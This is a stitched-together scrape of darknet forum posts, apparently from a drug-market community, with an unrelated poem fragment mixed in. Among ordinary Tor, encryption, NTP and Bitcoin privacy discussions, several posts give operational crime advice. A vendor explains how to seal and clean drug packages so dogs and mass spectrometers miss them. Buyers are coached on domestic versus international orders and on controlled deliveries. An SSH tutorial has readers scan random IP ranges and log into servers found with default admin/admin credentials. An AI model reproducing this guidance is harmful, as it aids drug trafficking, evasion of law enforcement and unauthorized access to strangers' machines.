vendors from Farmer Bob. Very useful in terms of picking the right packaging and cleaning the surface to ensure any traces have been removed.  [author=Farmerbob link=topic=76.msg62827#msg62827 date=1385533965] I'm glad to see this is finally getting adopted but there's a lot of misinformation going around.  #1 Ignore Mylar & foil!! only use laminates that were designed and manufactured to be used as moisture barrier bagging. MBBs are a subset of ""Mylar"" but Mylar does not equate to MBB. Many products that are referred to as Mylar and maybe even look and feel just like MBBs are not suitable for use here. Beware of product substitution.  #2 don't use Irons, curling irons, or food vac sealers. They won't give you the consistency & quality of an impulse sealer. Get a quality impulse sealer (5mm+ width) and read online how to check seal quality. You should be able to see the outline of the seal-line insulation fabric imprinted on one side. bond some pieces and pull, the bag should tear rather than the seal peeling apart. Once you get your heat setting where you like it keep it there but re-check it every few hundred seals.  #3 leave some air in the package, clean in in a sink with detergent/soap and rinse in bleachwater. when it's in the detergent sink squeeze the bags to look for air leakage, no bubble should come out. Before you pull them out of the bleach bucket wash your hands well. At this point neither a bloodhound nor a mass spectrometer will pick up a scent from any enclosed drugs provided you don't re-contaminate the bag or contaminate the mailing materials.  #4: Purchase MBBs from wherever you like, plutopete, amazon, ebay, etc (anonymously). There are survivalists, hobbyists, and plenty of small businesses that buy these. They went out of style with the big-time smugglers decades ago. Purchasing them won't be suspicious and it's perfectly legal.   Removing Trace Particles Properly:  [author=Farmerbob link=topic=76.msg68691#msg68691 date=1385853735]  The ""right"" way to do it is to ensure you wash off both polar and nopolar surface contaminants.. so detergent wash followed by IPA and/or acetone followed by deionized water rinse would be the technique you'd use if you could do it properly. The issue is ""do it properly"" good cleanroom surface cleaning technique is difficult to master. You have to wipe in one direction only and rotate the rag as you wipe, OR you have to spray the bag from the top down and let gravity wash the contamination down. The risk is that most people, even trained ""professionals"" cleaning with alcohol will simply smear contamination around and not actually remove it.  sodium hypochlorite bleach (Clorox in north america) is probably a better choice for the masses. Bleach will oxidize most organic molecules. Residues that are left behind after a detergent wash will react with the bleach in the bucket the oxidized byproducts would likely pass even careful laboratory analysis (MS swab test).  An alternative for the lazy is to just throw the packs in your dishwasher with a splash of bleach. I've done that when I was vending and I had a lot of weed orders to go out and didn't feel like spending too much time cleaning them. In my case I used a peroxide bleach but everyone else should be fine with Clorox.",""

I struggled a lot with my security setup. But finally figured it all out. This little tutorial is for those who want to chain your SOCKS via TOR on Whonix. This means You > Whonix > Torbrowser > Socks.  I recommend you useing a VPN making the connection: You > VPN > Whonix > Torbrowser > Socks.  Firstly, Whonix tunnels ALL information via TOR. This being said, when TOR does not work, so does your internet connection on your Whonix machine. This is only a small tutorial how to chain SOCKS via your TORbrowser, I will NOT cover how to install Whonix in the first place. There is another great thread addressing this issue.  Secondly, When doing this, your TORbutton in your browser will not work (You see a red cross in the tor icon in the left screen of your browser). But remember as i said before, Whonix tunnels everything via TOR. You can test this via check.torproject.org. I always recommend you doing this before you perfom any web visiting with or without SOCKS. Check your IP information via check2ip.com.  Do NOT forget to make a new snapshot in VirtualBox! (Backup current state)  Alright, here the small guide:      ","1.    Download proxychains:    Open the start menu    Type konsole    Type in sudo apt-get update && sudo apt-get install proxychains    Enter your password and hit y    2.    Start tor, Type in browser address bar:    about:config    Make sure most of the settings are default except the following:    network.proxy.no_proxies_on = "" ""    network.proxy.socks = "" ""    network.proxy.socks_port = 0    network.proxy.socks_remote_dns = false    close tor    3.    Start tor, Now click the little onion button in the top left next to the arrows, make    sure that the button is set to ""Use custom proxy settings"" but there is no proxy    listed under SOCKS host nor are any localhosts listed    4.    Change proxychains settings    Simple, just type    sudo nano /etc/proxychains.conf    At the end remove all the proxies and add just one: The VIP72 proxy    socks4 127.0.0.1 9951    5.    Use TOR via proxychains    to use, simply type in console:    proxychains torbrowser"

"The Hub Forums",".ShapeShiftingShapeS.","3170.0","2014-05-31T18:03:51","Security Tutorials","General Discussion/Security","In the wake of the recent TrueCrypt confusion i thought it might be useful to post a TOMB tutorial.  This is not my tutorial. I just nabbed it from the paranoid #! security guide.(great read, partially outdated but still useful)  so far i just tried if it works with crunchbang linux. it should run without problems on debian based distributions like ubuntu or mint but i haven't looked into TAILS+Tomb now. i'll give it a shot in the next few days and will update if needed. i also can not guarantee that it is safe to use. it relies on well known and peer reviewed components but i can not speak for the script itself.all credit goes to oblivion from the crunchbang forums  ok here we go:    Tomb uses LUKS AES/SHA-256 and can thus be consider secure. But Tomb isn't just a possible replacement for tools like TrueCrypt.  It has some really neat and easy to use features:  1) Separation of encrypted file and key 2) Mounting files and folders in predefined places using bind-hooks 3) Hiding keys in picture-files using steganography  The documentation on Tomb I was able to find, frankly, seems to be scattered all over the place. After I played around with it a bit I also came up with some tricks that I did not see being mentioned in any documentation.  And because I like to have everything in one place I wrote a short manual myself:  Installation:  First you will need to import dyne's keys and add them to your gpg-keylist:  $ sudo gpg --fetch-keys http://apt.dyne.org/software.pub  Now verify the key-fingerprint.  $ sudo gpg --fingerprint software@dyne.org | grep fingerprint  The output of the above command should be:  Key fingerprint = 8E1A A01C F209 587D 5706  3A36 E314 AFFA 8A7C 92F1  Now, after checking that you have the right key you can trust add it to apt:  $ sudo gpg --armor --export software@dyne.org > dyne.gpg $ sudo apt-key add dyne.gpg  After you did this you want to add dyne's repos to your sources.list:  $ sudo geany /etc/apt/sources.list  Add:  deb http://apt.dyne.org/debian dyne main deb-src http://apt.dyne.org/debian dyne main  To sync apt:  $ sudo apt-get update  To install Tomb:  $ sudo apt-get install tomb  Usage:  If you have your swap activated Tomb will urge you to turn it off or encrypt it. If you encrypt it and leave it on you will need to include --ignore-swap into your tomb-commands. To turn off swap for this session you can run  $ swapoff -a  To disable it completely you can comment out the swap in /etc/fstab. So it won't be mounted on reboot. (Please be aware that disabling swap on older computers with not much ram isn't such a good idea. Once your ram is being used fully while having no swap-partition mounted processes and programs will crash.)  Tomb will create the crypto-file in the folder you are currently in - so if you want to create a tomb-file in your documents-folder make sure to  $ cd /home/user/documents  Once you are in the right folder you can create a tomb-file with this command:  $ tomb -s XX create FILE  XX is used to denote the size of the file in MB. So in order to create a file named ""test"" with the size of 10MB you would type this:  $ tomb -s 10 create test  Please note that if you haven't turned off your swap you will need to modify this command as follows:  $ tomb --ignore-swap -s 10 create test  To unlock and mount that file on /media/test type:  $ tomb open test.tomb   To unlock and mount to a different location:  $ tomb open test.tomb /different/location  To close that particular file and lock it:  $ tomb close /media/test.tomb  To close all tomb-files:  $ tomb close all  or simply:  $ tomb slam  After these basic operations we come to the fun part: Advanced Tomb-Sorcery  Obviously having a file lying around somewhere entitled: ""secret.tomb"" isn't such a good idea, really.  A better idea is to make it harder for an attacker to even find the encrypted files you are using. To do this we will simply move its content to another file.  Example:  $ touch true-story.txt true-story.txt.key $ mv secret.tomb true-story.txt $ mv secret.tomb.key true-story.txt.key  Now you have changed the filename of the encrypted file in such a way that it can't easily be detected.  When doing this you have to make sure that the filename syntax tomb uses is conserved:  filename.suffix  filename.suffix.key  Otherwise you will have trouble opening the file.  After having hidden your file you might also want to move the key to another medium.  $ mv true-story.txt.key /medium/of/your/choice  Now we have produced quite a bit of obfuscation. Now let's take this even further:  After we have renamed our tomb-file and separated key and file we now want to make sure our key can't be found either.  To do this we will hide it within a jpeg-file.  $ tomb bury true-story.txt.key invisible-bike.jpg  You will need to enter a steganography-password in the process.  Now rename the original keyfile to something like ""true-story.txt.key-backup"" and check if everything worked:  $ tomb exhume true-story.txt.key invisible-bike.jpg  Your key should have reappeared now. After making sure that everything works you can safely bury the key again and delete the residual key that usually stays in the key's original folder.  By default Tomb's encrypted file and key need to be in one folder. If you have separated the two you will have to modify your opening-command:  $ tomb -k /medium/of/your/choice/true-story.txt.key open true-story.txt  To change the key-files password:  $ tomb passwd true-story.txt.key  If, let's say, you want to use Tomb to encrypt your icedove mail-folders you can easily do that. Usually it would be a pain in the butt to do this kind of stuff with e.g. truecrypt because you would need to setup a container, move the folder to the container and when using the folder you would have to move back to its original place again.  Tomb does this with ease:  Simply move the folders you want to encrypt into the root of the tomb-file you created.  Example:  You want to encrypt your entire .icedove folder. Then you make a tomb-file for it and move the .icedove folder into that tomb. The next thing you do is create a file named ""bind-hooks"" and place it in the same dir. This file will contain a simple table like this:  .icedove .icedove .folder-x .folder-x .folder-y .folder-y .folder-z .folder-z  The fist column denotes the path relative to the tomb's root. The second column represents the path relative to the user's home folder.  So if you simply wanted to encrypt your .icedove folder - which resides in /home/user/ the above notation is fine. If you want the folder to be mounted elsewhere in the your /home you need to adjust the lines accordingly.  One thing you need to do after you moved the original folder into the tomb is to create a dummy-folder into which the original's folders content can be mounted. So you simply go into /home/user and create a folder named "".icedove"" and leave it empty.  The next time you open and mount that tomb-file your .icedove folder will be where it should be and will disappear as soon as you close the tomb. Pretty nice, hu?  I advise to test this out before you actually move all your mails and prefs into the tomb. Or simply make a backup. But use some kind of safety-net in order not to screw up your settings.  ",""

VPNs and SSH tunnels can both securely âtunnelâ network traffic over an encrypted connection. Theyâre similar in some ways, but different in others, if youâre trying to decide which to use, it helps to understand how each works.  SSH Tunneling A.K.A ""poor manâs VPN""  SSH Tunneling uses strong encryption, you can set your SSH client to act as a SOCKS proxy. Once you have, you can configure applications on your computer ""such as your web browser"" to use the SOCKS proxy. The traffic enters the SOCKS proxy running on your local system and the SSH client forwards it through the SSH connection ""this is known as SSH tunneling"". This works similarly to browsing the web over a VPN, your traffic appears to be coming from the SSH server. The traffic between your computer and the SSH server is encrypted, so you can browse over an encrypted connection as you could with a VPN.  Most thing you have to keep in mind, Using VPN will automatically force all network traffic on the system through it. SSH is not a VPN, you must configure each application to use the SSH tunnelâs proxy.  First of all,  You have to download this Tunnelier Client Bitvise SSH Client : http://www.bitvise.com/ssh-client-download  As this is a newbie Tutorial, Easiest way to scan and check SSH is ""shellbox"" You can find it here : http://ntweb.org/products/shellbox  You don't have to buy the Scanner unless you want to save the results scanned, The trial works fine, just copy the IP to Bitvise using admin/admin  You can either import your own IP list to scan for SSH, or Scan random IP ranges provided by the scanner    Configuring Your Browser :  *http://i56.servimg.com/u/f56/12/98/40/13/ssh110.png*    Using the SSH scanner ""shellbox"" :  *http://i56.servimg.com/u/f56/12/98/40/13/111.png*  *http://i56.servimg.com/u/f56/12/98/40/13/211.png*   Configuring SSH Client ""Bitvise"" :  *http://i56.servimg.com/u/f56/12/98/40/13/311.png*  *http://i56.servimg.com/u/f56/12/98/40/13/511.png*  That's all, I recommended FireFox using this method, after you configure all, check your IP before doing anything.

I know going to clearweb from .onion sites is not such a good idea, the way it was described to me was when you go to a dark web site you go threw layers of encryption but going the other way does it in reverse.  I also read something similar on a Tor blog on the offical Tor project site, I'm naturally paranoid being on drugs this long so I'm not about to take any chances. But if its true it would be a good idea to let people know, seeing the amount of vendors phished obviously some people just click any link they like thinking Tor will protect them so educating them would not only protect these users but the markets they use as a whole",""

That is very appreciated.You don't have to worry much about visiting clearnet sites on Tor. People give the warning just in case the site contains malicious JS or Flash that may expose your ip. As long as you have Tor Properly configured, you should be okay. Plus, there are extra precautions you can take as well. I'll be sure to add some more tuts and look around the other threads as well too bud. Let me know if you ever have any other questions or concerns.

But at my back in a cold blast I hear The rattle of the bones, and chuckle spread from ear to ear.  A rat crept softly through the vegetation Dragging its slimy belly on the bank While I was fishing in the dull canal On a winter evening round behind the gashouse Musing upon the king my brotherâs wreck And on the king my fatherâs death before him. White bodies naked on the low damp ground And bones cast in a little low dry garret, Rattled by the ratâs foot only, year to year. But at my back from time to time I hear The sound of horns and motors, which shall bring Sweeney to Mrs. Porter in the spring. O the moon shone bright on Mrs. Porter And on her daughter They wash their feet in soda water Et O ces voix dâenfants, chantant dans la coupole!

Given Evo's history, I believe it's run by some Eastern European organized crime group, which would explain its high production values and high focus on fraud items. It would also explain its security and longevity despite the huge amount of bad publicity it's gotten as of late. Eastern European law enforcement doesn't cooperate with western cops and are often complicit in crimes and easily bought off. Agora could likely be run by a similar group, but the word ""Agora"" doesn't exactly rub with Eastern Europeans as it's a Greek word. Agora is likely based out of the US or UK or some other western nation, but the site's admins are likely connected to some OC group, not like SR/SR2 where it was run by everymen/hipsters.","Quote from: denguy58 on December 13, 2014, 06:11:43 amHas anybody else come across posts referring to EVO as a possible LE site because of its lack of ""problems""?Yeah I've read posts on deep web that refer to that...everything runs really well...not like agora etcIt is very well designed...but imo you have more choice on agora and the fact agora is down alot makes me think they're constantly working on securityI know there was fuck ups with deposits a couple of weeks back but I got mine in the endTbh...I use both and have no problemBut there were rumours that SR2 was a honeypot and had been ifiltrated when it first startedIt seems to be the nature of the beast so far that marketplaces only have a certain shelf life...but I guess we'll have to wait and see."

He asked if there was any good markets then added the caveat ""Besides Agora and Evolution""    How can you ask what the best of something is then immediately dismiss what the best actually is?    The irony.   We want the market we use to run well... But not TOO well.  I've mentioned this accusation to one of the staff, and while it is a serious accusation that people believe, they find it as amusing as I do. The fact that Evo 'runs too smoothly' that is. Nothing I've seen thus far would lead me to believe that Evo is in any way run or operated by LEO. If I was lead to believe that in any way I'd be sure to share it. Of course no one could ever know for sure until it's too late, but if we operated under the assumption that markets were ran by LE there would be no darknet. I hardly think 'the market is run well' is cause for concern.   The whole 'I called it' thing is getting annoying. There's a term for this, and it's called confirmation bias. While the staff may have been close enough to get a good read on the situation I don't think the community was. It was just a baseless accusation that happened to come true.

Sorry for not sharing earlier. I'm probably dropping some stuff that DNMs don't want their competitors to know about. After all, it is in their interest to have their competition fail.  This one affects a lot of the hidden services. Especially the small sites set up by people with little knowledge about how this sort of stuff works.  The gaping security hole is ntpd in conjunction with Tor and http. Now, before you think about buffer overflows or ""I patched my ntpd yesterday"". That is not it.  Most systems running Tor use ntpd to keep their clocks in sync. (Especially relays. Clock skew is bad for Tor for various reasons. I won't cover them here. You can check out the Tor mailing lists for info.)  This is necessary when running a hidden service with a webserver hooked to it. The webserver reveals your clock in the Date header. Example: If your clock is, say, always 11 minutes too fast and you are hosting more than one hidden website they are easily tied together using your clock. Even if you change the other http headers and perform other tricks you can correlate the onion addresses. It is also sometimes possible to unclock servers this way when they possibly expose other services to the clearnet at the same time that reveals their clock. (This is not news.)  State actors passively collect Tor statistics. Globally. They know when you are running Tor, even if you are not a relay. They know if you are uploading to Tor constantly and your bandwidth patterns are consistent with running a hidden service. (Also not news.)  Now, the ntp protocol uses udp and Tor only routes tcp. ntp also doesn't have any signing or authentication on the replies. ntpd uses clock sources from many time servers (called pools) to ensure the clock source is accurate. So most people just sync their clocks with ntp in the clear - ""business as usual.) This is bad. Very bad.  Enter the arena of the NSA/GCHQ. They watch for Tor and ntp coming out of an IP address and use QUANTUM INSERT (and others) to slowly move your clock ahead by replying to the ntp requests faster than the real servers can. (CDN of pwnage.) At the same time they make innocent-looking http requests of all of the onion addresses they are looking for. As soon as your clock moves ahead to the desired spot they have your real IP. Whoops.  This attack is real. We had a honeypot set up last year and we saw it happening.  P.S. SIGAINT has never been vulnerable to this skew attack because we installed a GPS to set our clock last year. It was a simple fix.   ",""

Put it on a crontab every hour? That leap might be detectable too depending on how crappy/drifty your server is.  You could get your own atomic clock, but I'm sure that would really blow your opsec.     Then an attacker wouldn't be able to corellate all of your onion sites together, but the ntp+Tor attack still stands (assuming you are using ntp on one of the virtual servers or the hypervisor machine).  Also, virtualization is not a magic security bullet. See this famous quote:   ""You've been smoking something really mind altering, and I think you should share it.x86 virtualization is about basically placing another nearly full kernel, full of new bugs, on top of a nasty x86 architecture which barely has correct page protection. Then running your operating system on the other side of this brand new pile of shit.You are absolutely deluded, if not stupid, if you think that a worldwide collection of software engineers who can't write operating systems or applications without security holes, can then turn around and suddenly write virtualization layers without security holes."" - Theo de Raadt, founder of OpenBSD   That all depends on how accurate you want your clock and how you will combat drift. You could attach a GPS to a machine that you have locally and replicate that trusted clock back to your server over Tor. That would work. ","the first thing that comes to my mind is not using ntp for time synchronization, amirite?;and if you have multiple hs running in virtual environment that are separate from each other, with inconsistent time skew, then what?;let's say i'm working on a remote server to which i have no physical access, so getting the time out of GPS is not an option. i'm curious if running time synchronization in a random manner, but say, really really often, using random ""trusted"" servers, can mitigate the problem? like, let's say, i get time from remote HTTP(S) servers and/or hidden services serving some websites?And what about guessing the time based on tor's consensus?"

For example, 95% of the hosting companies I've used over the years still email root passwords in the clear. Lots of hosts just resell other hosts and those hosts probably email credentials too. Did they buy a Cisco router? Did the NSA backdoor it by intercepting the mail? Did the host order the servers online with their company credit card? Exploitable IPMIs. Shitty IPKVMs. EOL'd PDUs. All dangling on the Internet. (Just food for thought here.)  Okay, lets say the host is actually secure. ""They"" could still manipulate your hosting company's clock and know which host you are at. Sure, it would be vastly more detectable. (Assuming your host isn't asleep at the wheel.) Plus, they'd have to do some extra traffic confirmation attacks to know the specific IP address at that host assuming there is Tor traffic coming from more than one IP at that NOC.   Yes, that could work. Just set the clocks and let them drift apart. Don't use ntp at all. Perhaps just tlsdate *once* when they boot. Do the tlsdate call over Tor to a large https site that you know has the lowest chance of being MITM-ed. Google comes to mind.  Probably use two physically separated servers too for extra security. Mix architectures for extra points. Say sparc64 and arm. Make exploit writers really work for glory.   Interesting.  I always figured that a perfect clock that can't be tricked to deviate would be best, but I guess purposely giving out a bad clock might work in your favour in certain setups too. It really just boils down to if an attacker can move your clock to deanonymize you. ","Most hosting providers have their own time sources and provide local ntpd. This significantly reduces to nearly zero the opportunity for direct packet manipulation against traffic traversing WAN links/IXs or submarine cables.;As you are already aware, high value HS should not be running the HS Tor instance on the same system as the hidden service itself (web service or whatever). That way an external attacker can still potentially derive the Tor instance system time but not correlate it with the actual web servers system time. They will have their own unique time skews.;An interesting and possibly more attainabe solution may be to execute a periodic task on the system to add a little jitter to the system clock immediately after each NTP update, maybe a random increment/decrement of up to 250ms every 10 minutes or so (you'd wnt to randomize the periodic delay too).

"The Hub Forums","Angel Eyes","6764.0","2015-01-30T02:28:02","International or domestic safer","Start Here/For Beginners"," Generally, domestic ordering is safer than international.  This is because international shipments go through customs which provides more scrutiny, checking packages for contraband, bombs, etc.  There's more chance there will be dogs sniffing international packages as well.  Additionally, the pool of international orders is much smaller than domestic which means your package will not as easily lost in the haystack.  Considering the above, I'd rather order internationally from a vendor that uses excellent stealth than from a domestic vendor that uses poor stealth, especially if the shipment contains very smelly stuff like marijuana.  As for whether it would be worse for you if a domestic or int'l vendor gets busted, if you are only ordering smallish amounts for personal use it really shouldn't make too much of a difference, though remember that customs searches the packages coming into your home country, so if they do find your contraband there might be more chance of them performing a controlled delivery on you, though probably not if its personal use/small amounts.  Bulk is completely different.  If you're ordering in bulk I would always stick to domestic and only use first class or priority mailing so that your package is more of a needle in the haystack.  So to reiterate, if stealth is equal for domestic and int'l vendors I would stick with domestic.","Hi all.  I've always ordered international as I can get better deals, however I can now get domestic product at a reasonable price.I'd like to know your thoughts on the security aspects of ordering domestic, if a domestic vendor is busted would be worse than international as LE would follow a domestic lead.

I found this today and it's a kinda low-tech approach that was a different perspective to consider (for me, at least). It wouldn't really apply to most of our communication, since our most important communications take place 1:1, but since we were talking about the forum being scraped by bots, would something like this help? (nothing will ever make it stop, of course, but it might cut down on the the information harvested by bots?) What do you technoprodigies think about it?  This would only protect you from automated scraping/filtering/keywords. Come to think of it, I've been doing something like this for a while when using messaging systems that are part of e-commerce sites. They are so strict about keeping buyer-seller communicaitons right there on the market site, that you can't use anything even remotely resembling an email address or your message won't send. I've even tried sending it a few letters at a time in consecutive messages, and that didn't work either. So I made a captcha-type image of my email address and attach it when I really need to transmit my email address.  I do love my Amnesty International, and I love their adorable ideas. Here's the message I wrote, converted into this bot-resistent font the article discusses:  http://matrixtxri745dfw.onion/neo/uploads/150405/MATRIXtxri745dfwONION_212512RsR_Screenshotfrom2015-04-0521:15:49.png  Clear net link: http://www.fastcocreate.com/3044569/amnesty-internationals-mutant-font-promises-to-protect-your-privacy-online  quoted: Amnesty International's ""Mutant Font"" Promises To Protect Your Privacy Online By Megan Haynes  To help you hide from the bots that monitor digital communications, the human rights body has unveiled a free-to-use mutating font.  Internet privacy is a sticky topic in this post-Snowden world. At this point, many of us just assume that once our words become bits and hit a network, some entity is tracking and analyzing them.  As part of a new campaign out of Brazil, Amnesty International is trying to make sure that only human eyes are spying your online communications. According to Amnesty International, 80% of Brazilians are against the concept of the U.S. government intercepting or storing Internet data. (Interestingly, they are more okay with the Brazilian government doing the same thing, with only 65% saying theyâre against local authorities intercepting, storing, and analyzing communications by Internet.)  A common tool for this invasion of privacy is the use of bots, or machines that scour the Net to pick up key words and the like. But Amnesty contends this constitutes a violation of the Universal Declaration of Human Rights.  To hammer home the point, and provide a potentially useful tool for Internet users wishing to keep their writing for human consumption only, Amnesty and Brazil-based agency Africa created a website that generates fonts unreadable by machines. Using the Mutant Font is simple: People wishing to post online can simply type their text into the tool, and the site will generate a code that can then be embedded directly onto a blog.  The text appears in a font thatâs legible to the human eye, but has extra characteristics, like wavy lines or dots all around it, that make it hard for bots to pick up.  There are seven different types of font available, and the code itself regenerates on the Mutantfont.com site every 24 hours, creating hundreds of thousands, if not millions, of unique codes for the bots to have to sort through, theoretically leaving your content free from spying eyes. Think of it like a CAPTCHA program on steroids.  The agency tells us the Mutant Font works on standard publishing platforms like WordPress and any open website working on http or https protocols. Now, you just have to worry about your emails, phone calls, credit cards . . . ",""

I will have to give it a whirl once I access a computer with a hard drive, or at least an OS that isn't TAILS, lol. Did you have java disabled? would that make a difference? I was assuming that once the html was pasted it would show the image like the one I posted, as it generated for me on the site. I had to enable java for the image to be shown, which made sense since this is a method meant to use on clearnet for blogging. I don't know what the point would be otherwise.  I thought it was kind of interesting too - it was a different way of looking at the problem, but also for people whose privacy needs are somewhat different than most of ours. ","Thanks, this is interesting. Did you try pasting to see the html? Either it's not working today or I'm missing a step, after the copy, the pasted results are coming out as a really simple code with no html.

Meaning that those two keys are related to the same private key. Again, I am not sure why the last 4 bytes changed, but if you are worried about it, take an old message sent to you that worked with your old key and try and decrypt it. If it works, there is nothing wrong with your key. I think  NightCrawler is the expert on this though.",""

Always have an expiration date on your key, and always have a revocation certificate backed up somewhere in case your key is compromised.  ",""

I tend to leave around a hour or two between taking the two substances, and the effects can vary in interesting ways depending on which is consumed first."

Bitcoin over Tor isn't a good idea  Cryptography and Security   Bitcoin is a decentralized P2P digital currency in which coins are generated by a distributed set of miners and transaction are broadcasted via a peer-to-peer network. While Bitcoin provides some level of anonymity (or rather pseudonymity) by encouraging the users to have any number of random-looking Bitcoin addresses, recent research shows that this level of anonymity is rather low. This encourages users to connect to the Bitcoin network through anonymizers like Tor and motivates development of default Tor functionality for popular mobile SPV clients.  In this paper we show that combining Tor and Bitcoin creates an attack vector for the deterministic and stealthy man-in-the-middle attacks. A low-resource attacker can gain full control of information flows between all users who chose to use Bitcoin over Tor.In particular the attacker can link together user's transactions regardless of pseudonyms used, control which Bitcoin blocks and transactions are relayed to the user and can delay or discard user's transactions and blocks. In collusion with a powerful miner double-spending attacks become possible and a totally virtual Bitcoin reality can be created for such set of users.  To understand the rationale of what's going on I recommend the full paper: http://arxiv.org/pdf/1410.6079v1   To address concerns regarding this potential vulnerability, this website has been created:   http://openbitcoinprivacyproject.org/torban/www/ It lists the Tor exit nodes that have recently been used to connect to the Bitcoin network. The logic is that if people are accessing the network  from a narrow pool of exit nodes, then it could potentially identify an attack in progress.  a  Regarding accessing Electrum onion servers: I have not had any difficulties with accessing servers since I modified my persistence settings to ensure that the blockchain headers file that Electrum creates is kept across reboots.

First, multibit doesn't support the features of bitcoinj that allow proxy support -- that means that every node you directly talk to in the network knows your IP and knows if you broadcast at transaction. The only way to get around that currently is to use something like whoonix which will enforce tor connections for all outgoing traffic by running in a virtual machine.   Second, multibit will use bloom filters to speed up block chain sync. Bloom filters are a potential privacy leak because they can tie addresses together. A node that knows your bloom filter will be able to say know that certain transactions may be related to you (altho it isn't proven).   If you want nothing in your wallet tied together via almost any means, it will take some work. Keep your wallet completely offline. Update balances for each address using seperate tor exit nodes and ideally several different public blockchain sites. Never tie two of your addresses together into a single tx, or send or recieve money from the same address in your wallet. If you need to spend, grab the outputs from your address to be spent using an online computer, sign offline, and then push the tx out using an anonymous method like http://eligius.st/~wizkid057/newstats/pushtxn.php which will push the tx out to eligius's pool.

I think perhaps the areas he talked about should be addressed in depth. This is just my uneducated opinion.  The first major step (in some people's eyes) is deciding on the best OS for security. This is a summary of my process of elimination for a main OS.  1. Windows, Mac, or *nix.    For this, only *nix wins. The others are closed-source, can't be reviewed for vulnerabilities. They quickly turn useful for people in the context of the joke where you don't need to outrun a bear, only your slower friend. Thinking of OSX/Win7 as your slow friend is probably your best course of action.  2. ""Open Source""    What some may not realize is that the majority of *nix distributions are not truly ""open source."" The main linux kernel relies on ""binary blobs"" which are vendor-supplied in proprietary form to operate as device drivers. Lurk moar for why this is a really bad idea. The upshot is that if you had concerns about windows or OSX for proprietary code reasons, you NECESSARILY have the same concerns about the blobs. Which OSs does this leave? Don't worry, it is a really short list.     Dragora    Dyne:bolic    Parabola    Trisquel    gNewSense    Musix    Debian HURD    OpenBSD  3. Current    Of the OS short list, a few may be knocked out due to lack of current support. This is a concern due to exploits such as Shellshock. In case you missed shellshock, it was kind of a big deal for people who run anything *nix.     https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29        Dragora has not been updated in two years.    Dyne:bolic has not been updated in three years.    Debian HURD has not been updated since 2013.     This leaves:        Parabola    Trisquel    gNewSense    Musix    OpenBSD  4. Security    This is partially outside of the ""which OS"" discussion, but you should really consider using grsecurity/PaX at a minimum for any of these builds, excepting OpenBSD. Also, AFAIK, TBB can be used on all of the remaining OSs.  As an aside, I want to make a few notes on this before I get flamed.  -I stuck to mainstream distributions of linux, because of the slightly higher chance that there are helpful forums which could assist some sort of software fuckup. Also to avoid some asshole who just got his BS-CS and thinks he can TOTALLY make a better operating system. His mom TOTALLY uses it on her main rig. -I purposefully did not include any roll-your-own OSs, such as using linux-libre in gentoo. If you are at the point where you are recompiling your own kernel, this post was not intended for you. -The minimal effort from the short list, in my opinion, is Trisquel. Your mileage may vary. -In case you missed it, TAILS did not make the short list. That sucks. TAILS uses binary blobs. They don't deny it.     https://tails.boum.org/contribute/design/#index15h3 -Ms. Rutkowska's article about obfuscation vs. correctness vs. isolation should loom heavy here. My approach is that you should use all three, and the knockout rounds are way easier if your starting point is correctness. -Firmware, hardware, and software are all REALLY important, but had limited impact on which OS is the most secure in isolated consideration. -There are other ways to discount various linux distributions, such as Debian being the NSA's bitch* or whether systemd is the spawn of satan, but these are more technical, and less philosophically glaring. Blobs means a real possibility of corporate or government backdoors.    *https://igurublog.wordpress.com/2014/04/08/julian-assange-debian-is-owned-by-the-nsa/  I you are interested, please tell me why I am wrong, or what I missed. I truly care, since 2n+2 eyes are better than 2.   tl;dr - All OSs suck, and TAILS has a dirty secret.",""

"The Hub Forums","Crow_of_Old","7245.0","2015-03-13T03:33:48","OS analysis","General Discussion/Security"," I have four points of contention with using Qubes OS:  1. Binary Blobs 2. Ignoring obfuscation and correctness 3. Ignoring firmware pitfalls 4. Requiring/Recommending bad hardware  Let's dig in:  1. Binary Blobs  Just...just read this thread - second post (https://groups.google.com/forum/#!topic/qubes-devel/FZWfesrrwz4). Furthermore, the Xen hypervisor itself works with binary blobs. See (http://xenbits.xenproject.org/docs/unstable/misc/efi.html), under ""ucode=<filename>."" See also (https://lists.debian.org/debian-kernel/2014/07/msg00160.html).  As a personal note, I think that Rutkowska's reply was an intellectual throwing up of the hands. You can't just accept a problem because it is pervasive. She's certainly talented enough to fix such a problem, but she seems to have surrendered instead.  2. Ignoring obfuscation and correctness  From Qubes' FAQ's (http://www.qubes-os.org/wiki/UserFaq/#Whataboutotherapproachestosecurity), the devs feel as though either of the other two approaches are not reasonable sources of security. Qubes focuses on protecting from vulnerabilities in software, but not on maintaining your anonymity the way Tails does. I personally appreciate trying to be mindful of all three areas.  3. Ignoring firmware pitfalls  Although Qubes uses IOMMU (VT-d) to prevent DMA attacks, Xen still must boot after the rest of the machine starts up. See (https://en.wikipedia.org/wiki/Xen). I don't think many people know how much extra code is mobilized in the bootup process. Further, a user who relies on any hardware-backdoor-mitigation from Qubes' design is in for a world of hurt, due to potential firmware backdoors in other devices that need not communicate with the main machine, such as keyboard firmware relayed OOB to AMT. Note, the example is a hypothetical. I have no idea whether that is a probable attack vector.  4. Requiring/Recommending bad hardware  From QubesOS' own hardware compatibility list, (https://wiki.qubes-os.org/wiki/HCL), I picked a laptop from this lineup - the Lenovo Thinkpad T410 running a i5-520M procssor. According to (http://ark.intel.com/products/47341/Intel-Core-i5-520M-Processor-3M-Cache-2_40-GHz), that processor has vPro. On the QubesOS list, the laptop was listed as having ""green status"" in all relevant fields, which they equate with having their highers security level. This, of course, means that the Qubes devs have either ignored the OOB bullshit, or think that isolation has saved them. At this point, I have surpassed my technical understanding of the matter, and only rely on my instincts to say that any group that RECOMMENDS a vpro machine is not concerned with your security.","I wonder what your take on qubes is"
